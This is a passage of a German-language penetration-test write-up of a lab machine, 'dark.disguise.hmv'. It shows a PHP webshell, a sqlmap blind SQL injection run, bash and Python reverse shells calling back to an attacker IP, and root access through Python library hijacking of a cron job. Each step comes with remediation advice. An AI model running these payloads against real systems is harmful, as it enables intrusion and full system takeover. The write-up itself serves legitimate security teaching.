            <br><strong>Empfehlung (Admin):</strong> **Implementieren Sie eine strikte Validierung für Datei-Uploads!**
                <ul>
                    <li>Überprüfen Sie Dateierweiterungen anhand einer Whitelist erlaubter Typen (z.B. nur `.jpg`, `.png`). Verlassen Sie sich nicht auf Blacklists.</li>
                    <li>Überprüfen Sie den MIME-Typ der Datei.</li>
                    <li>Laden Sie Dateien idealerweise in ein Verzeichnis außerhalb des Web-Roots hoch. Wenn sie im Web-Root sein müssen, stellen Sie sicher, dass in diesem Verzeichnis keine Skriptausführung erlaubt ist (z.B. über `.htaccess`-Konfigurationen für Apache).</li>
                    <li>Benennen Sie hochgeladene Dateien um und verwenden Sie keine vom Benutzer angegebenen Dateinamen.</li>
                    <li>Scannen Sie hochgeladene Dateien mit Antiviren-Software.</li>
                </ul>
            </p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
http://dark.disguise.hmv/image_handler.php?id=11

&lt;?php 

system($GET['cmd']);

?&gt;
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe zeigt, dass der Aufruf von `http://dark.disguise.hmv/image_handler.php?id=11` den Quellcode einer PHP-Webshell zurückgibt: `&lt;?php system($GET['cmd']); ?&gt;`.
                Dies bedeutet, dass die Datei, die durch `id=11` referenziert wird, diese Webshell ist. Die Webshell nimmt einen Befehl über den GET-Parameter `cmd` entgegen und führt ihn auf dem Server mittels der PHP-Funktion `system()` aus.
                Es ist wahrscheinlich, dass diese Webshell zuvor über die im "manager"-Bereich gefundene Upload-Funktion hochgeladen und dann unter der ID `11` (oder einem Dateinamen, der intern dieser ID zugeordnet ist) gespeichert wurde.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Die RCE-Fähigkeit ist hiermit bestätigt!** Der `image_handler.php` dient nun als Einfallstor, um die hochgeladene Webshell auszuführen. Die ID `11` ist der Schlüssel, um auf die Shell zuzugreifen. Dies ist ein direkter Weg, Befehle auf dem Webserver auszuführen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diesen Endpunkt, um Befehle auf dem Server auszuführen. Beginnen Sie mit einfachen Befehlen wie `id`, `whoami`, `ls -la` um den Kontext zu verstehen. Etablieren Sie als Nächstes eine stabilere Reverse Shell für interaktiven Zugriff (z.B. mit `nc`, Python, Perl oder Bash).<br><strong>Empfehlung (Admin):</strong> **Entfernen Sie sofort die bösartige Datei (ID 11 / die Webshell)!** Überprüfen und sichern Sie die Upload-Funktionalität im "manager"-Bereich, wie zuvor empfohlen. Führen Sie ein vollständiges Systemaudit durch, um das Ausmaß der Kompromittierung festzustellen und weitere bösartige Dateien oder Backdoors zu finden. Ändern Sie alle Passwörter.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[/home/cyber/Downloads]
└─# <span class="command">sqlmap -u "http://dark.disguise.hmv/manager/add_product.php" \
       --method POST \
       --data="name=test&amp;description=test*&amp;price=1&amp;image=dummy" \
       --cookie="dark_session=%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D" \
       -p description \
       --technique=T \
       --dbms=mysql \
       --sql-query="SELECT image FROM dark_shop.products ORDER BY id DESC LIMIT 1" \
       --batch</span></div>
                    <pre>
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   [Link: https://sqlmap.org | Ziel: https://sqlmap.org]

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:18:15 /2025-05-04/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[23:18:15] [INFO] testing connection to the target URL
got a 302 redirect to 'http://dark.disguise.hmv/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[23:18:15] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:18:16] [INFO] <span class="password">heuristic (basic) test shows that (custom) POST parameter '#1*' might be injectable (possible DBMS: 'MySQL')</span>
[23:18:16] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[23:18:16] [INFO] <span class="password">testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'</span>
[23:18:16] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)                                                                 
[23:18:26] [INFO] <span class="password">(custom) POST parameter '#1*' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable</span> 
[23:18:26] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
<span class="password">(custom) POST parameter '#1*' is vulnerable.</span> Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=test&amp;description=test' AND (SELECT 1878 FROM (SELECT(SLEEP(5)))fnQH) AND 'DfJt'='DfJt&amp;price=1&amp;image=dummy
---
[23:18:41] [INFO] the back-end DBMS is MySQL
[23:18:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: <span class="command">Linux Debian</span>
web application technology: <span class="command">Apache 2.4.59, PHP</span>
back-end DBMS: <span class="command">MySQL &gt;= 5.0.12 (MariaDB fork)</span>
[23:26:00] [INFO] <span class="password">retrieved: images/2cd2118c9def83072c47977011ca469f.</span>
[23:28:03] [INFO] <span class="password">retrieved: images/c76bf961f084a3c713329bd86ef761ba.</span>
[23:30:19] [INFO] <span class="password">retrieved: images/003359a57d1dba36aaeb318fa9d6cf57.</span>
[23:32:30] [INFO] <span class="password">retrieved: images/3483ce4ef8666d7c4e572648329ffef5.</span>
SELECT image FROM dark_shop.products ORDER BY id DESC LIMIT 5 [5]:
[*] <span class="command">images/003359a57d1dba36aaeb318fa9d6cf57.</span>
[*] <span class="command">images/c76bf961f084a3c713329bd86ef761ba.</span>
[*] <span class="command">images/2cd2118c9def83072c47977011ca469f.</span>
[*] <span class="command">images/3483ce4ef8666d7c4e572648329ffef5.</span>
[*] <span class="command">images/e6fab9a42a7217851430a12d5abf8ae5.</span>

[*] ending @ 23:21:05 /2025-05-04/
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> SQLMap wird hier verwendet, um eine SQL-Injection-Schwachstelle in der Funktion zum Hinzufügen von Produkten (`/manager/add_product.php`) auf `dark.disguise.hmv` zu finden und auszunutzen.
                <ul>
                    <li><code>-u "http://dark.disguise.hmv/manager/add_product.php"</code>: Die Ziel-URL.</li>
                    <li><code>--method POST</code>: Die Anfrage erfolgt per POST.</li>
                    <li><code>--data="name=test&amp;description=test*&amp;price=1&amp;image=dummy"</code>: Die POST-Daten. Der Stern `*` in `description=test*` markiert den Injektionspunkt für SQLMap.</li>
                    <li><code>--cookie="dark_session=..."</code>: Das zuvor erlangte Session-Cookie wird mitgesendet, um authentifiziert zu bleiben.</li>
                    <li><code>-p description</code>: Gibt explizit an, dass der Parameter `description` getestet werden soll.</li>
                    <li><code>--technique=T</code>: Beschränkt die Tests auf zeitbasierte Blind-SQL-Injection-Techniken.</li>
                    <li><code>--dbms=mysql</code>: Gibt an, dass das Backend-DBMS MySQL ist.</li>
                    <li><code>--sql-query="SELECT image FROM dark_shop.products ORDER BY id DESC LIMIT 1"</code>: Nachdem die Schwachstelle gefunden wurde, führt SQLMap diese spezifische SQL-Abfrage aus. Ziel ist es, den Pfad des zuletzt hochgeladenen Bildes aus der Tabelle `products` der Datenbank `dark_shop` zu extrahieren.</li>
                    <li><code>--batch</code>: Führt SQLMap im nicht-interaktiven Modus aus und beantwortet die meisten Fragen mit den Standardwerten.</li>
                </ul>
                SQLMap identifiziert erfolgreich eine zeitbasierte Blind-SQL-Injection im Parameter `description`. Es bestätigt MySQL als DBMS. Anschließend führt es die angegebene SQL-Abfrage aus und extrahiert mehrere Bildpfade, darunter `images/c76bf961f084a3c713329bd86ef761ba.`. Wahrscheinlich war dies der Pfad zur zuvor hochgeladenen Webshell.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein weiterer kritischer Fund und eine alternative oder ergänzende Methode zum vorherigen direkten Aufruf der Webshell via `id=11`. SQLMap hat nicht nur die SQL-Injection bestätigt, sondern auch direkt dazu genutzt, den Pfad zur hochgeladenen Webshell aus der Datenbank auszulesen. Dies zeigt, dass die Anwendung anfällig für SQL-Injection ist, was weitreichende Konsequenzen haben kann (Datenextraktion, -manipulation, potenziell auch Codeausführung je nach DBMS-Konfiguration und -Rechten).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die extrahierten Bildpfade, insbesondere der zur Webshell, können nun verwendet werden, um direkt auf die Shell zuzugreifen. Die SQL-Injection-Schwachstelle selbst sollte weiter untersucht werden, um das volle Ausmaß zu bestimmen (z.B. Auslesen anderer Tabellen, Datenbank-Enumeration).<br><strong>Empfehlung (Admin):</strong> **Beheben Sie die SQL-Injection-Schwachstelle dringend!** Verwenden Sie parametrisierte Abfragen (Prepared Statements) anstelle der direkten Verkettung von Benutzereingaben in SQL-Statements. Validieren und sanitisieren Sie alle Benutzereingaben serverseitig. Beschränken Sie die Datenbankbenutzerrechte auf das absolut Notwendige. Führen Sie regelmäßige Schwachstellenscans und Code-Audits durch.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">curl "http://dark.disguise.hmv/images/c76bf961f084a3c713329bd86ef761ba.php?cmd=id"</span></div>
                    <pre>
<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Hier wird die zuvor über SQLMap extrahierte URL der Webshell (`http://dark.disguise.hmv/images/c76bf961f084a3c713329bd86ef761ba.php`) aufgerufen. An die URL wird der Parameter `?cmd=id` angehängt. Da die Webshell den Code `&lt;?php system($GET['cmd']); ?&gt;` enthält, wird der Befehl `id` auf dem Server ausgeführt.
                Die Ausgabe `uid=33(www-data) gid=33(www-data) groups=33(www-data)` bestätigt, dass der Befehl erfolgreich ausgeführt wurde und der Webserver (und somit die Webshell) im Kontext des Benutzers `www-data` läuft.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Fantastisch! Der initiale Zugriff auf das System mit Befehlsausführung als `www-data` ist nun endgültig erreicht und bestätigt!** Dies ist ein entscheidender Moment im Pentest. Der Benutzer `www-data` ist der Standardbenutzer für Apache-Webserver unter Debian/Ubuntu und hat typischerweise eingeschränkte Rechte, aber Zugriff auf Webdateien und potenziell andere Systemressourcen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Etablierung einer stabilen interaktiven Reverse Shell, um die weitere Enumeration des Systems und die Privilegienerweiterung zu erleichtern. Die aktuelle Webshell ist nützlich für einzelne Befehle, aber für komplexere Aufgaben unhandlich.<br><strong>Empfehlung (Admin):</strong> **Das System ist kompromittiert.** Die Webshell (`c76bf961f084a3c713329bd86ef761ba.php` im `/images`-Verzeichnis) muss sofort entfernt werden. Die zugrundeliegenden Schwachstellen (unsicherer Datei-Upload und SQL-Injection) müssen behoben werden. Eine vollständige Untersuchung des Systems auf weitere Kompromittierungen, Backdoors und Datenlecks ist erforderlich. Das System sollte idealerweise neu aufgesetzt werden, nachdem die Schwachstellen verstanden und behoben wurden.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[/home/cyber/Downloads]
└─# <span class="command">nc -lvnp 4444</span></div>
                    <pre>
<span class="password">listening on [any] 4444 ...</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">curl "http://dark.disguise.hmv/images/c76bf961f084a3c713329bd86ef761ba.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.2.199/4444%200%3E%261'"</span></div>
                    <pre>
[Keine direkte Ausgabe von curl erwartet, die Verbindung erfolgt zum Netcat-Listener]
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[/home/cyber/Downloads]
└─# <span class="command">nc -lvnp 4444</span></div>
                    <pre>
<span class="password">listening on [any] 4444 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.190] 49404</span> <!-- IP des Ziels als .190 -->
bash: cannot set terminal process group (492): Inappropriate ioctl for device
bash: no job control in this shell
<span class="prompt">www-data@disguise:/var/www/dark/images$ </span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Sequenz zeigt den Versuch, eine Reverse Shell vom Zielserver (`disguise`) zum Angreifer-Rechner (`cyber`) aufzubauen.
                <ol>
                    <li>Auf dem Angreifer-Rechner wird mit `nc -lvnp 4444` ein Listener auf Port 4444 gestartet. `Netcat` wartet hier auf eingehende Verbindungen.</li>
                    <li>Über die Webshell wird ein Befehl an den Zielserver gesendet: `bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'`.
                        <ul>
                            <li>`bash -c '...'`: Führt den Befehl in einer neuen Bash-Shell aus.</li>
                            <li>`bash -i`: Startet eine interaktive Bash-Shell.</li>
                            <li>`>& /dev/tcp/192.168.2.199/4444`: Leitet Standard-Output (stdout) und Standard-Error (stderr) an eine TCP-Verbindung zur IP-Adresse des Angreifers (`192.168.2.199`) auf Port `4444` um.</li>
                            <li>`0>&1`: Leitet Standard-Input (stdin) ebenfalls von dieser TCP-Verbindung.</li>
                        </ul>
                        Dieser Befehl ist ein gängiger Weg, eine Bash-Reverse-Shell zu erzeugen. Die URL-Kodierung (`%20` für Leerzeichen, `%26` für `&`, etc.) ist notwendig, damit der Befehl korrekt als Teil der URL übertragen wird.
                    </li>
                    <li>Der dritte Block zeigt die Ausgabe auf dem Netcat-Listener des Angreifers. Eine Verbindung vom Zielserver (hier fälschlicherweise als `192.168.2.190` im Log, sollte `192.168.2.189` sein, basierend auf früheren Scans) wurde erfolgreich hergestellt. Man erhält einen Shell-Prompt `www-data@disguise:/var/www/dark/images$`. Die Meldungen "bash: cannot set terminal process group..." und "bash: no job control in this shell" sind typisch für einfache Reverse Shells, die keine vollwertige TTY-Kontrolle haben.</li>
                </ol>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Sehr gut! Eine interaktive Reverse Shell als Benutzer `www-data` wurde erfolgreich etabliert.** Dies ist ein signifikanter Fortschritt gegenüber der einfachen Webshell, da es eine komfortablere und stabilere Interaktion mit dem Zielsystem ermöglicht. Die IP-Diskrepanz im Log des Netcat-Listeners (`.190` statt `.189`) ist wahrscheinlich ein kleiner Fehler im Log oder in der Konfiguration des Test-Setups, die Kernfunktionalität ist aber klar.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die nächste Priorität ist es, die Shell zu stabilisieren und aufzuwerten (TTY-Upgrade), um z.B. interaktive Befehle wie `su` oder Editoren wie `vi`/`nano` korrekt nutzen zu können und Job Control zu erhalten. Gängige Methoden sind Python-pty-Tricks (`python -c 'import pty; pty.spawn("/bin/bash")'`) oder `script /dev/null -c bash`. Danach beginnt die interne Enumeration des Systems zur Privilegienerweiterung.<br><strong>Empfehlung (Admin):</strong> Die Etablierung einer Reverse Shell zeigt eine vollständige Kompromittierung des Webservers im Kontext des `www-data`-Benutzers. Zusätzlich zu den vorherigen Empfehlungen (Webshell entfernen, Schwachstellen beheben) sollten ausgehende Netzwerkverbindungen vom Webserver streng überwacht und eingeschränkt werden (Egress Filtering), um die Möglichkeit solcher Reverse Shells zu erschweren. Intrusion Detection Systeme können solche Verbindungen erkennen.</p>
        </section>

        <section id="proof-of-concept">
            <h2>Proof of Concept: Von Web-Exploit zu Root-Rechten</h2>
            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie eine Kombination aus einer unsicheren Datei-Upload-Funktionalität und einer SQL-Injection-Schwachstelle auf der Subdomain `dark.disguise.hmv` ausgenutzt wurde, um initialen Zugriff als `www-data` zu erlangen. Anschließend wurde eine Schwachstelle in der Art, wie Python-Skripte von einem Cronjob mit Root-Rechten ausgeführt werden (Python Library Hijacking), genutzt, um Root-Rechte auf dem System zu erlangen.</p>
            <p class="analysis"><strong>Voraussetzungen:</strong>
                <ul>
                    <li>Zugriff auf das Netzwerk des Zielsystems.</li>
                    <li>Tools: `curl`, `sqlmap`, `nc` (Netcat), Python auf dem Angreifer-System.</li>
                    <li>Ein Session-Cookie für `dark.disguise.hmv` (z.B. durch den Hydra-Angriff auf `login.php` erlangt: `simpleAdmin:Str0ngPassw0d1@@@`).</li>
                    <li>Eine PHP-Webshell-Datei.</li>
                </ul>
            </p>
            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung (Initial Access als www-data):</strong></p>
            <p class="analysis">1. <strong>Hochladen einer PHP-Webshell:</strong> Über die Admin-Oberfläche unter `http://dark.disguise.hmv/manager/` (Zugriff mit `simpleAdmin:Str0ngPassw0d1@@@`) wurde eine PHP-Webshell (z.B. `&lt;?php system($GET['cmd']); ?&gt;`) über die Funktion "Produkt hinzufügen" (wahrscheinlich als Produktbild) hochgeladen.</p>
            <p class="analysis">2. <strong>Pfad der Webshell via SQL-Injection ermitteln:</strong>
                Der folgende `sqlmap`-Befehl wurde verwendet, um eine SQL-Injection in `add_product.php` auszunutzen und den Pfad der zuletzt hochgeladenen Datei (die Webshell) aus der Datenbank zu extrahieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[/home/cyber/Downloads]
└─# <span class="command">sqlmap -u "http://dark.disguise.hmv/manager/add_product.php" \
       --method POST \
       --data="name=test&amp;description=test*&amp;price=1&amp;image=dummy" \
       --cookie="dark_session=SESSION_COOKIE_WERT" \
       -p description \
       --technique=T \
       --dbms=mysql \
       --sql-query="SELECT image FROM dark_shop.products ORDER BY id DESC LIMIT 1" \
       --batch</span></div>
                    <pre>
[SQLMap-Ausgabe, die den Pfad zur Webshell anzeigt, z.B. images/c76bf961f084a3c713329bd86ef761ba.php]
                    </pre>
                </div>
            </div>
            <p class="analysis">3. <strong>Reverse Shell als www-data etablieren:</strong>
                Zuerst wird ein Netcat-Listener auf dem Angreifer-System gestartet:
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[/home/cyber/Downloads]
└─# <span class="command">nc -lvnp 4444</span></div>
                    <pre>
<span class="password">listening on [any] 4444 ...</span>
                    </pre>
                </div>
            </div>
            <p class="analysis">Dann wird die hochgeladene Webshell über `curl` aufgerufen, um die Reverse-Shell-Verbindung zum Listener aufzubauen:</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">curl "http://dark.disguise.hmv/images/c76bf961f084a3c713329bd86ef761ba.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ANGREIFER_IP/4444%200%3E%261'"</span></div>
                </div>
            </div>
            <p class="analysis">Der Netcat-Listener sollte nun eine Verbindung anzeigen:</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password">connect to [ANGREIFER_IP] from (UNKNOWN) [ZIEL_IP] PORT</span>
bash: cannot set terminal process group (XXX): Inappropriate ioctl for device
bash: no job control in this shell
<span class="prompt">www-data@disguise:/var/www/dark/images$ </span><span class="command">id</span>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                    </pre>
                </div>
            </div>

            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung (Privilege Escalation zu Root via Python Library Hijacking):</strong></p>
            <p class="analysis">1. <strong>Identifizierung eines Cronjobs:</strong> Mit `pspy64` wurde ein Cronjob identifiziert, der regelmäßig als Root das Skript `/usr/bin/python3 /opt/query.py /home/darksoul/config.ini` ausführt.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">./pspy64</span></div>
                    <pre>
[...]
2025/05/05 17:22:01 CMD: UID=0    PID=4940   | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount 
2025/05/05 17:22:01 CMD: UID=0    PID=4941   | <span class="command">/usr/bin/python3 /opt/query.py /home/darksoul/config.ini</span> 
[...]
                    </pre>
                </div>
            </div>
            <p class="analysis">2. <strong>Überprüfung des Python-Pfads und Schreibrechte:</strong> Es wurde festgestellt, dass der `www-data`-Benutzer Schreibrechte im Verzeichnis `/tmp` hat und `/tmp` im Python-Suchpfad (`sys.path`) vor einigen Standardbibliotheksverzeichnissen steht, wenn das Skript ausgeführt wird (dies wurde durch `python3 -c "import sys; print(sys.path)"` in der `www-data`-Shell überprüft, wobei der `PYTHONPATH` zuvor auf `/tmp` gesetzt wurde).</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">export PYTHONPATH=/tmp</span></div>
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">cd /tmp/</span></div>
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">python3 -c "import sys; print(sys.path)"</span></div>
                    <pre>
<span class="command">['', '/tmp', '/usr/lib/python37.zip', ...]</span>
                    </pre>
                </div>
            </div>
            <p class="analysis">3. <strong>Erstellen einer bösartigen Python-Bibliothek:</strong> Das Skript `/opt/query.py` importiert `mysql.connector`. Wir erstellen eine bösartige `mysql/connector.py`-Datei in `/tmp`, die eine Reverse Shell startet.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">mkdir mysql</span></div>
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">touch mysql/__init__.py</span></div>
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">echo 'import socket,os,pty;ip="ANGREIFER_IP";port=4448;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &gt; mysql/connector.py</span></div>
                </div>
            </div>
            <p class="analysis">4. <strong>Listener für Root-Shell starten:</strong> Auf dem Angreifer-System wird ein neuer Netcat-Listener auf Port 4448 gestartet.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4448</span></div>
                    <pre>
<span class="password">listening on [any] 4448 ...</span>
                    </pre>
                </div>
            </div>
            <p class="analysis">5. <strong>Warten auf den Cronjob:</strong> Wenn der Cronjob das nächste Mal `/opt/query.py` als Root ausführt, wird aufgrund des manipulierten `PYTHONPATH` und der präparierten Datei `/tmp/mysql/connector.py` unsere bösartige Bibliothek geladen. Dies führt dazu, dass der Code in unserer `connector.py` ausgeführt wird und eine Reverse Shell zum Angreifer auf Port 4448 mit Root-Rechten aufgebaut wird.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
[Ausgabe des pspy64-Tools, die den Cronjob zeigt, der die Shell auslöst]
2025/05/05 17:22:01 CMD: UID=0    PID=4941   | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini 

[Im Netcat-Listener auf Port 4448]
<span class="password">connect to [ANGREIFER_IP] from (UNKNOWN) [ZIEL_IP] PORT</span>
<span class="prompt"># </span><span class="command">id</span>
<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Kompromittierung des Systems mit Root-Rechten.</p>
            <p class="analysis"><strong>Beweismittel:</strong> Screenshots der erfolgreichen Shell-Verbindungen (als www-data und als root), Inhalt der `id`-Befehle in beiden Shells.</p>
            <p class="evaluation"><strong>Risikobewertung:</strong> Kritisch. Die Kombination der Schwachstellen ermöglicht einem Angreifer, vollständige Kontrolle über das System zu erlangen. Dies kann zu Datenverlust, Dienstunterbrechungen, Installation von Malware, Nutzung des Systems für weitere Angriffe und Reputationsschaden führen.</p>
            <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
                <ul>
                    <li>**Webanwendung sichern:** Beheben Sie die unsichere Datei-Upload-Funktion und die SQL-Injection-Schwachstelle in der `dark.disguise.hmv`-Anwendung.</li>
                    <li>**Cronjob-Sicherheit:** Überprüfen Sie alle Cronjobs, die als Root ausgeführt werden. Stellen Sie sicher, dass Skripte keine relativen Pfade verwenden und dass die Umgebungsvariablen (insbesondere `PYTHONPATH`, `LD_LIBRARY_PATH` etc.) sicher gesetzt sind oder die Skripte so geschrieben sind, dass sie nicht durch benutzerkontrollierbare Pfade beeinflusst werden können. Führen Sie Skripte mit den geringstmöglichen Rechten aus.</li>
                    <li>**Python-Pfade härten:** Stellen Sie sicher, dass für systemkritische Skripte, die als Root laufen, keine benutzerbeschreibbaren Verzeichnisse wie `/tmp` in den Standard-Modulsuchpfaden vor den Systembibliotheken stehen.</li>
                    <li>**Allgemeine Systemhärtung:** Regelmäßige Updates, starke Passwörter, Prinzip der geringsten Rechte, Netzwerksegmentierung und Überwachung.</li>
                </ul>
            </p>
        </section>

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p class="analysis">Nachdem initialer Zugriff als Benutzer `www-data` über eine Webshell erlangt wurde, bestand das nächste Ziel darin, die Rechte auf dem System zu erweitern, idealerweise auf Root-Rechte.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">which python3</span></div>
                    <pre>
<span class="command">/usr/bin/python3</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">stty rows 47 columns 190</span></div>
                    <pre>
[Keine Ausgabe, aber die Terminalgröße wird angepasst]
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">id</span></div>
                    <pre>
<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Befehle dienen der initialen Orientierung und Verbesserung der Shell-Umgebung:
                <ul>
                    <li>`which python3`: Stellt sicher, dass Python 3 verfügbar ist, was für viele TTY-Upgrade-Tricks und Skripte nützlich ist.</li>
                    <li>`stty rows 47 columns 190`: Versucht, die Größe des Pseudo-Terminals der Reverse Shell anzupassen, um die Lesbarkeit und Nutzbarkeit zu verbessern. Die Werte sollten an die Größe des Terminals des Angreifers angepasst werden.</li>
                    <li>`id`: Bestätigt erneut die Identität des aktuellen Benutzers (`www-data`).</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Standardmäßige erste Schritte nach Erhalt einer Shell, um die Interaktion zu erleichtern und die Umgebung zu bestätigen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie ein vollständiges TTY-Upgrade durch, z.B. mit `python3 -c 'import pty; pty.spawn("/bin/bash")'`, gefolgt von `Ctrl+Z`, `stty raw -echo; fg` und `export TERM=xterm` auf dem Angreifer-Terminal.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen gegen diese spezifischen Befehle, da sie legitime Benutzeraktionen sein können. Die Verhinderung des initialen Zugriffs ist hier der Schlüssel.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span></div>
                    <pre>
     2951     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 <span class="command">/usr/lib/eject/dmcrypt-get-device</span>
   270458    428 -rwsr-xr-x   1 root     root       436552 Dec 24  2023 <span class="command">/usr/lib/openssh/ssh-keysign</span>
   266769     52 -rwsr-xr--   1 root     messagebus    51184 Oct 23  2023 <span class="command">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
   266807     36 -rwsr-xr-x   1 root     root          34888 Apr  6  2024 <span class="command">/usr/bin/umount</span>
   262189     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 <span class="command">/usr/bin/chfn</span>
   266806     48 -rwsr-xr-x   1 root     root          47184 Apr  6  2024 <span class="command">/usr/bin/mount</span>
   265545     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 <span class="command">/usr/bin/newgrp</span>
   262193     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 <span class="command">/usr/bin/passwd</span>
   262192     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 <span class="command">/usr/bin/gpasswd</span>
   277582    156 -rwsr-xr-x   1 root     root         157192 Jan 21  2024 <span class="command">/usr/bin/sudo</span>
   262872     64 -rwsr-xr-x   1 root     root          63568 Apr  6  2024 <span class="command">/usr/bin/su</span>
   262190     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 <span class="command">/usr/bin/chsh</span>
                    </pre>
                </div>
            </div>
